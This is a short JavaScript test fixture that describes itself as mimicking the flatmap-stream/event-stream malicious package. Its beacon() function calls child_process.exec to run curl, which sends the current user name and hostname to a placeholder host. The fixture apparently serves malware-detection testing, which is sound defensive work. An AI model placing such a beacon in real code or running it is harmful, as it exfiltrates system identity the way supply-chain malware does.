// SYNTHETIC recall fixture (mirrors OSV MAL-2025-20690, flatmap-stream / event-stream):
// child_process.exec with a command-substitution literal. The host does not exist.
const cp = require('child_process');

function beacon() {
  cp.exec('curl -s https://invalid.example/$(whoami)/$(hostname)', () => {});
}

module.exports = { beacon };
